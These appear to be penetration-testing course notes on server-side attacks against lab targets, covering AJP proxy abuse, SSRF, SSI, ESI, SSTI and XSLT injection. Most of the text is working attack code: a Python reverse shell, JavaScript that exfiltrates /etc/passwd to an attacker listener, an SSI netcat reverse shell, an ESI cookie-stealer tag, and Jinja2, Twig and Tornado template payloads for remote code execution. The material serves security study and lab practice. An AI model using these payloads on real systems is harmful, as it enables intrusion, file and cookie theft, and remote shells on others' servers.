# Server-Side Attacks

1. [Abusing Intermediary Apps](#abusing-intermediary-apps)
1. [SSRF](#ssrf)
1. [SSI Injection](#ssi-injection)
1. [ESI Injection](#esi-injection)
1. [SSTI](#ssti)
1. [XSLT](#xslt)

## Abusing Intermediary Apps

* AJP Proxy:

  * For Apache, AJP (or JK) is a wire protocol, an optimized version of HTTP to allow a standalone web server (like Apache) to talk to Tomcat

  * If a server has open AJP proxy ports (8009 TCP), we may be able to use them to access the (hidden) Apache Tomcat Manager; AJP-Proxy is a binary protocol, so we can configure our own Nginx/Apache webserver with AJP modules to interact with it

* Nginx reverse proxy & AJP:

  * Download nginx source code and the required module, and compile it:

    ```shell
    # download nginx source code
    wget https://nginx.org/download/nginx-1.21.3.tar.gz
    
    tar -xzvf nginx-1.21.3.tar.gz

    # download the required 'ajp_module' and compile nginx source code
    git clone https://github.com/dvershinin/nginx_ajp_module.git

    cd nginx-1.21.3

    sudo apt install libpcre3-dev

    ./configure --add-module=`pwd`/../nginx_ajp_module --prefix=/etc/nginx --sbin-path=/usr/sbin/nginx --modules-path=/usr/lib/nginx/modules

    make

    sudo make install

    nginx -V
    # to verify, shows nginx version along with nginx_ajp_module configured
    ```
  
  * Then, create a configuration file pointing to the AJP port (8009); comment out the entire ```server``` block and append the following inside the ```http``` block in ```/etc/nginx/conf/nginx.conf``` (where 10.129.40.80 is the target server, for example):

    ```nginx
    upstream tomcats {
      server 10.129.40.80:8009;
      keepalive 10;
      }
    server {
      listen 8080;
      location / {
        ajp_keep_conn on;
        ajp_pass tomcats;
      }
    }
    ```
  
  * Start nginx and check if everything is working by issuing a request to localhost (we have to use the same listening port as above):

    ```shell
    sudo nginx

    curl http://127.0.0.1:8080
    # this should give us the page for the Apache Tomcat Manager
    ```

* Apache reverse proxy & AJP:

  * Install the libapache2-mod-jk package, and enable the AJP module (Apache has it precompiled); and create the config file pointing to the target AJP Proxy port:

    ```shell
    # Apache also uses port 80 as its default
    # if needed, we can Apache default port on /etc/apache2/ports.conf

    sudo apt install libapache2-mod-jk
    
    sudo a2enmod proxy_ajp

    sudo a2enmod proxy_http

    export TARGET="10.129.40.80"
    # target server

    echo -n """<Proxy *>
    Order allow,deny
    Allow from all
    </Proxy>
    ProxyPass / ajp://$TARGET:8009/
    ProxyPassReverse / ajp://$TARGET:8009/""" | sudo tee /etc/apache2/sites-available/ajp-proxy.conf
    # created config file pointing to 8009

    sudo ln -s /etc/apache2/sites-available/ajp-proxy.conf /etc/apache2/sites-enabled/ajp-proxy.conf

    sudo systemctl start apache2
    ```

    ```shell
    # access the 'hidden' Apache Tomcat Manager page
    # assuming that Apache is listening on port 80 - default
    curl http://127.0.0.1
    ```

## SSRF

* SSRF (Server-Side Request Forgery) attacks:

  * abuse server functionality to perform internal/external resource requests
  * need to provide or modify URLS used by target app to read/post data
  * exploiting SSRF vulns can lead to access to internal services, local data (files, hashes, etc.) and possible RCE

* SSRF Exploitation example:

  * Run a quick ```nmap``` scan for target machine:

    ```shell
    nmap -T5 -A -Pn -p- 10.129.201.238
    # shows open ports
    ```
  
  * Interact with the target:

    ```shell
    curl -i -s http://10.129.201.238
    # shows request redirected to '/load?q=index.html'

    # follow redirect
    curl -i -s -L http://10.129.201.238

    # shows that ubuntu-web.lalaguna.local is the target
    # and internal.app.local is an app on the internal network, which cannot be accessed currently
    ```
  
  * We need to check if the ```q``` parameter is vulnerable to SSRF; if it is, we can try reaching the internal web app using it

  * Testing for SSRF:

    ```shell
    # setup listener
    nc -nvlp 8080

    # issue request to target webapp with our listener instead of 'index.html'
    curl -i -s "http://10.129.201.238/load?q=http://10.10.15.174:8080"
    
    # we get the HTTP response output on our listener
    # this confirms the SSRF vuln
    # since request is issued by target server
    ```
  
  * From HTTP response, we can see target server is using ```User-Agent: Python-urllib/3.8```; from the docs we can see that ```urllib``` supports ```file```, ```http``` and ```ftp``` schemas

  * Using ```urllib``` functionality to fetch remote and local files:

    ```shell
    # create a test 'index.html'
    vim index.html

    # start HTTP server in same directory
    python3 -m http.server 9090

    # also setup and start FTP server
    sudo pip3 install twisted
    sudo python3 -m twisted ftp -p 21 -r .

    # fetch remote file through target app via FTP
    curl -i -s "http://10.129.201.238/load?q=ftp://10.10.15.174/index.html"

    # fetch remote file through target app via HTTP
    curl -i -s "http://10.129.201.238/load?q=http://10.10.15.174:9090/index.html"

    # fetch local file through target app
    curl -i -s "http://10.129.201.238/load?q=file:///etc/passwd"
    ```
  
  * Testing for any internal apps and listening only on localhost:

    ```shell
    # create wordlist for all ports
    for port in {1..65535};do echo $port >> ports.txt;done

    # issue request to random port to get response size of a request for non-existent service
    curl -i -s "http://10.129.201.238/load?q=http://127.0.0.1:1"

    # use ffuf to enumerate and filter out this response size
    ffuf -w ports.txt:PORT -u "http://10.129.201.238/load?q=http://127.0.0.1:PORT" -fs 30 -s
    # -s for silent mode
    # we get ports 80, 5000
    ```
  
  * Interact with this app listening on port 5000:

    ```shell
    curl -i -s "http://10.129.201.238/load?q=http://127.0.0.1:5000"
    ```
  
  * Now, we can try attacking ```internal.app.local``` found earlier, again using SSRF:

    ```shell
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=index.html"
    # fetches the internal app webpage as expected
    # as both apps load resources via the 'q' parameter
    ```
  
  * Trying to discover any web apps listening in localhost:

    ```shell
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http://127.0.0.1:1"
    # here we get 'unknown url type' error
    # it seems the web app is removing '://' part of the URL from request

    # modifying the URL
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:1"
    
    # this shows an expected response
    # web app shows the 'connection refused' message as it is a closed port
    
    # we can use ffuf to check for all ports, with regex for filtering
    ffuf -w ports.txt:PORT -u "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Connection refused'
    # this gives us ports 80, 5000
    ```
  
  * Interacting with this another app listening on port 5000:

    ```shell
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000"
    # shows a list of files - index.html, internal.py, internal_local.py and start.sh
    ```
  
  * Next, we can try checking the source code of web apps listening on ```internal.app.local```:

    ```shell
    # check '/proc/self/environ' file to find 'PWD' env var
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
    # '-o -' flag used to redirect output to file, cannot get output without that
    # this shows PWD is set to '/app'

    # retrieve local file 'internal_local.py' through target app
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=file:://///app/internal_local.py"
    # shows source code
    ```
  
  * From the source code of 'internal_local.py', we can see that there is a functionality of executing commands on remote host, by sending a GET request to ```/runme?x=<CMD>```:

    ```shell
    # interacting with app on port 5000 again to uncover RCE
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=whoami"

    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname -a"
    # commands with spaces do not work

    # we need to URL-encode the command - 3 times in this case, since we are passing through 3 different web apps
    curl -i -s "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=uname%252520-a"
    ```

* Blind SSRF - even if request is processed, we cannot see backend server's response; blind SSRF vulns can be detected via out-of-band techniques, making the server issue a request to an external service we control (using tools like Burp Collaborator or ```pingb.in```)

* Blind SSRF exploitation example:

  * Target app (listening on port 8080) is an app that converts HTML to PDF

  * We get the same response regardless of what HTML file has been uploaded

  * To test if app is vulnerable to blind SSRF, we can attempt to create a HTML file containing a link to a service under our control (e.g. - a listener using ```sudo nc -lvnp 9090```):

    ```html
    <!DOCTYPE html>
    <html>
    <body>
            <a>Hello World!</a>
            <img src="http://10.10.15.170:9090/x?=viaimgtag">
    </body>
    </html>
    ```
  
  * When we upload this HTML file, we get the same response; but on our listener, we get the name of the app that's being used to convert HTML to PDF - ```wkhtmltopdf```

  * According to ```wkhtmltopdf``` documentation, it can execute JS - we can leverage this to read local file:

    ```html
    <html>
        <body>
            <b>Exfiltration via Blind SSRF</b>
            <script>
            var readfile = new XMLHttpRequest(); // Read the local file
            var exfil = new XMLHttpRequest(); // Send the file to our server
            readfile.open("GET","file:///etc/passwd", true); 
            readfile.send();
            readfile.onload = function() {
                if (readfile.readyState === 4) {
                    var url = 'http://10.10.15.170:9090/?data='+btoa(this.response); // Send data encoded in base64
                    exfil.open("GET", url, true);
                    exfil.send();
                }
            }
            readfile.onerror = function(){document.write('<a>Oops!</a>');}
            </script>
        </body>
    </html>
    ```
  
  * We can start the HTTP server again, submit this HTML file, and once we get the response we can decode it

  * Also, similar to previous example, there is an underlying server ```internal.app.local``` here too - we can use a HTML file with a valid payload for exploiting the local app listening on the server

  * The underlying server uses Python, so we can use a reverse shell payload accordingly:

    ```bash
    export RHOST="10.10.15.170";export RPORT="9090";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
    ```
  
  * Similar to the previous instance, we would need to URL-encode the payload, twice (as it is passing through 2 web apps, also note the second parameter in URL includes ```:://``` to bypass filter), and then include it in the HTML file:

    ```html
    <html>
        <body>
            <b>Reverse Shell via Blind SSRF</b>
            <script>
            var http = new XMLHttpRequest();
            http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
            http.send();
            // GET request to internal.app.local, reach local app vulnerable to RCE via SSRF and execute payload
            http.onerror = function(){document.write('<a>Oops!</a>');}
            </script>
        </body>
    </html>
    ```
  
  * We need to start our listener again, and submit the HTML file with the payload, and we should get a reverse shell

* Time-based SSRF:

  * We can check if web app is vulnerable to SSRF by observing time differences in responses

  * For example, if there is a significant difference between a normal upload and a malicious upload (a HTML file including some IP address like ```<img src="http://blah.nonexistent.com">```) it can indicate vulnerability; furthermore, we can check by adding a valid URL (like the internal server ```internal.app.local```) and notice the time difference

## SSI Injection

* Server-side includes (SSI):

  * used by web apps to create dynamic content on HTML pages; evaluates SSI directives
  * extensions such as ```.shtml```, ```.shtm``` or ```.stm``` indicate use of SSI
  * we can submit payloads (SSI directives) through input fields to check for SSI injection
  * examples of SSI directives:

    ```html
    // Date
    <!--#echo var="DATE_LOCAL" -->

    // Modification date of a file
    <!--#flastmod file="index.html" -->

    // CGI Program results
    <!--#include virtual="/cgi-bin/counter.pl" -->

    // Including a footer
    <!--#include virtual="/footer.html" -->

    // Executing commands
    <!--#exec cmd="ls" -->

    // Setting variables
    <!--#set var="name" value="Rich" -->

    // Including virtual files (same directory)
    <!--#include virtual="file_to_include.html" -->

    // Including files (same directory)
    <!--#include file="file_to_include.html" -->

    // Print all variables
    <!--#printenv -->
    ```

* SSI injection exploitation example:

  * In the input field for the given webpage, we can try to identify if it is vulnerable to SSI injection by submitting SSI directives as payloads

  * The SSI directives work and we get the output in the page

  * We can also try SSI directive payloads for reverse shells:

    ```html
    <!--#exec cmd="mkfifo /tmp/foo;nc 10.10.15.160 4444 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
    ```

## ESI Injection

* Edge Side Includes (ESI):

  * XML-based markup language
  * enables heavy caching of web content; allows dynamic web content assembly
  * ESI tags used to instruct a HTTP surrogate (reverse-proxy, caching server, etc.) to fetch more info for webpage with an already cached template
  * ESI injection occurs when attacker manages to reflect malicious ESI tags in HTTP response
  * root cause of vuln - HTTP surrogates can't validate the ESI tag origin
  * some useful ESI tags:

    ```html
    // Basic detection
    <esi: include src=http://<PENTESTER IP>>

    // XSS Exploitation Example
    <esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>

    // Cookie Stealer (bypass httpOnly flag)
    <esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>

    // Introduce private local files (Not LFI per se)
    <esi:include src="supersecret.txt">

    // Valid for Akamai, sends debug information in the response
    <esi:debug/>
    ```
  
  * RCE can be achieved if app processing ESI directives supports XLST (dynamic language used to transform XML files); in that case, we can pass ```dca=xlst``` to payload

## SSTI

* Templates - used as intermediary format to create dynamic web content; template engines read tokenized strings from template documents, and produce rendered strings with values in output document

* Server-Side Template Injection (SSTI) - injecting malicious template directives inside a template

* SSTI vuln can be identified by injecting different tags in inputs to check if they're evaluated in response; sometimes we don't see injected data reflected in response, it could be blind (evaluated on a different page)

* Example SSTI payloads:

  ```html
  {7*7}
  ${7*7}
  #{7*7}
  %{7*7}
  {{7*7}}
  // we can check for 49 in response
  ```

* We can also inject combinations of special characters like ```${{<%[%'"}}%\``` used in template expressions; if an exception is caused, this indicates some control

* Based on type of working payload, it is possible to identify the underlying template engine; we can also check for verbose errors containing keywords or common extensions used

* Tools like [```tplmap```](https://github.com/epinna/tplmap), [```SSTImap```](https://github.com/vladko312/SSTImap) or J2EE scan (Burp Pro) can be used to test for SSTI vulns or create a payload list

* SSTI exploitation example 1:

  * For given webapp, we can start by trying SSTI payloads - the payload ```{{7*7}}``` is evaluated and we get 49 in response

  * Based on which payload works, we can use [the SSTI template engine decision tree](https://portswigger.net/web-security/server-side-template-injection) to find the underlying template engine

  * The payload ```{{7*'7'}}``` also gets evaluated to 49 - so we are either dealing with Jinja2 or Twig template engine

  * We can check for more payloads from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) or [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection) and check if it's Jinja2 or Twig

  * Twig-specific payloads like ```{{_self.env.display("TEST")}}``` and ```{{_self.env}}``` indicate that Twig is the underlying template engine

  * This process can be automated through ```tplmap``` as well:

    ```shell
    git clone https://github.com/epinna/tplmap.git

    cd tplmap

    pip install virtualenv

    virtualenv -p python2 venv

    source venv/bin/activate

    pip install -r requirements.txt

    # run tplmap
    ./tplmap.py -u 'http://94.237.63.93:59545' -d name=john
    # since user input is submitted via 'name' parameter through POST request

    # to get RCE through tplmap, use '--os-shell' flag
    ```
  
  * Twig has a variable ```_self``` which makes few of the internal APIs public; we can use it in our RCE payload - register a function as a filter callback via ```registerUndefinedFilterCallback```, and invoke ```_self.env.getFilter``` function to execute the just-registered function:

    ```php
    {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
    ```

    ```shell
    # submit payload via cURL
    curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://94.237.63.93:59545
    # we get command executed in response
    ```
  
  * When mathematical expressions are evaluated through SSTI, there's a possibility of XSS as well - can be confirmed by submitting a XSS payload within curly brackets, e.g. - ```{{<img src=x onerror=alert(1) />}}```

* SSTI exploitation example 2:

  * The target web app accepts user input for parameter 'email' through a POST request to '/jointheteam'; we can try some SSTI payloads:

    ```shell
    curl -X POST -d 'email={7*7}' http://94.237.54.170:59106/jointheteam

    curl -X POST -d 'email=${7*7}' http://94.237.54.170:59106/jointheteam

    curl -X POST -d 'email=#{7*7}' http://94.237.54.170:59106/jointheteam

    curl -X POST -d 'email=%{7*7}' http://94.237.54.170:59106/jointheteam

    curl -X POST -d 'email={{7*7}}' http://94.237.54.170:59106/jointheteam
    # this payload gets executed and we get 49 in response
    ```
  
  * As per the PortSwigger diagram, we can try next for payload ```{{7*'7'}}``` - this also gets executed, so we could be dealing with Jinja2 or Twig

  * However, any Jinja2 or Twig specific payloads throw '500: Internal Server Error':

    ```shell
    curl -X POST -d 'email={{_self.env}}' http://94.237.54.170:59106/jointheteam

    curl -X POST -d 'email={{settings.SECRET_KEY}}' http://94.237.54.170:59106/jointheteam
    ```
  
  * This methodology can be improved by compiling a list of template engine-specific payloads from multiple sources like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2) and [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection), and fuzzing the app until we can conclude on template engine; alternatively use automated tools

  * For the above, Tornado-specific payloads work, implying that is the underlying template engine:

    ```shell
    curl -X POST -d "email={% import os %}{{os.system('whoami')}}" http://94.237.54.170:59106/jointheteam
    # does not throw internal server error
    ```

  * Using an automated tool like ```tplmap``` also works:

    ```shell
    ./tplmap.py -u 'http://94.237.54.170:59106/jointheteam' -d email=test
    # this shows Tornado as the template engine

    ./tplmap.py -u 'http://94.237.54.170:59106/jointheteam' -d email=test --os-shell
    ```

* SSTI exploitation example 3:

  * For given target, we can test payloads for SSTI - like previous examples, this seems vulnerable as well:

    ```shell
    curl -gs "http://94.237.49.166:52590/execute?cmd={{7*7}}"
    # 49 in response

    curl -gs "http://94.237.49.166:52590/execute?cmd={{7*'7'}}"
    # this returns 7777777
    ```
  
  * Following the previous PortSwigger SSTI decision tree, based on the response to the above two payloads, we can see that the target is using Jinja2

  * For reference, some Python methods that can be used for payload crafting with respect to Jinja2:

    * ```__class__``` - returns object (class) to which type belongs
    * ```__mro__``` - returns tuple containing base class inherited by object
    * ```__subclasses__``` - each new class retains reference to subclasses; returns list of references in class
    * ```__builtins``` - returns builtin methods included in function
    * ```__globals``` - reference to dictionary containing global versions for a function
    * ```__base__``` - returns base class inherited by object
    * ```__init__``` - class initialization method
  
  * Example of these methods being used:

    ```python
    import flask
    s = 'HTB'
    type(s) # class 'str'
    s.__class__ # class 'str'

    dir (s) # shows all methods and attributes from object

    s.__class__.__class__ # class 'type'
    # going up the tree of inherited objects

    s.__class__.__base__ # class 'object'

    s.__class__.__base__.__subclasses__() # complete list of references for 'object' class

    s.__class__.mro()[1].__subclasses__() # does the same as above
    ```
  
  * Useful classes that can facilitate RCE:

    ```python
    # x = s.__class__.mro()[1].__subclasses__()
    # for i in range(len(x)):print(i, x[i].__name__)
    # prints all subclasses

    def searchfunc(name):
        x = s.__class__.mro()[1].__subclasses__()
        for i in range(len(x)):
                fn = x[i].__name__
                if fn.find(name) > -1:
                        print(i, fn)
    
    searchfunc('warning')

    y = x[147]

    y
    # class 'warnings.catch_warnings'

    z = y()._module.__builtins__

    for i in z:
        if i.find('import') >-1:
            print (i, z[i])
    # __import__ <built-in function __import__>
    ```
  
  * Searching for 'warning' gives us ```catch_warnings```; this class imports Python's ```sys``` module, and from ```sys```, we can reach ```os```. And searching further, we can find the import function as well, which can be used to execute code coming from a string object:

    ```python
    ''.__class__.__mro__[1].__subclasses__()[147]()._module.__builtins__['__import__']('os').system('echo RCE from a string object')
    # prints the string
    ```
  
  * Using this logic, we can test our payloads part-by-part to get RCE - we can use the web app directly and send our payloads as well

    * ```{{ ''.__class__ }}``` - gives 'str' class

    * ```{{ ''.__class__.__mro__ }}``` - gives class 'str' and class 'object'

    * ```{{ ''.__class__.__mro__[1] }}``` - gives class 'object' only since that's what we need

    * ```{{ ''.__class__.__mro__[1].__subclasses__() }}``` - lots of output, and we need to get the index for 'warnings'

    * We can use the following payload to show all references and their indices:

      ```python
      {% for i in range(450) %} 
      {{ i }}
      {{ ''.__class__.__mro__[1].__subclasses__()[i].__name__ }} 
      {% endfor %}
      ```

    * The above gives us index 214 for ```catch_warnings```; we can proceed with the payload we created earlier now

    * ```{{ ''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system('echo RCE test') }}``` - response shows '0', indicating the value of executed command, so it means executed without errors

    * ```{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').system("touch /tmp/test1") }}``` - this creates a test file, and also gives 0 in response

    * ```{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('ls /tmp').read()}}``` - this payload confirms our file is created

    * ```{{''.__class__.__mro__[1].__subclasses__()[214]()._module.__builtins__['__import__']('os').popen('python -c \'socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.170",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")\'').read()}}``` - full payload to get reverse shell, where we have included our listening IP and port as well

    * For Jinja2, we can use certain functions like ```request``` and ```lipsum``` for exploitation

    * ```{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}``` - executes 'id' command

    * ```{{lipsum.__globals__.os.popen('id').read()}}``` - alternative to above command

## XSLT

* Extensible Stylesheet Language Transformations (XLST) - XML-based language, used when transforming XML documents into HTML, PDF, or another XML document

* XLST server-side injection can occur when arbitrary XLST file upload is possible or when app generates XML document dynamically using malicious user input

* Example of malicious XSL file:

  ```xsl
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
  <xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
  </xsl:template>
  </xsl:stylesheet>
  ```

  ```shell
  # while doing the transformation, we can use the above file, readfile.xsl
  saxonb-xslt -xsl:readfile.xsl catalogue.xml
  # similarly, we can use XSL files for SSRF or fingerprinting
  ```

  ```xsl
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
  <xsl:include href="http://127.0.0.1:5000/xslt"/>
  <xsl:template match="/">
  </xsl:template>
  </xsl:stylesheet>
  ```

  ```xsl
  <?xml version="1.0" encoding="ISO-8859-1"?>
  <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
  Version: <xsl:value-of select="system-property('xsl:version')" /><br />
  Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
  Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
  <xsl:if test="system-property('xsl:product-name')">
  Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:product-version')">
  Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:is-schema-aware')">
  Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:supports-serialization')">
  Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
  /><br />
  </xsl:if>
  <xsl:if test="system-property('xsl:supports-backwards-compatibility')">
  Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
  /><br />
  </xsl:if>
  </xsl:template>
  </xsl:stylesheet>
  ```
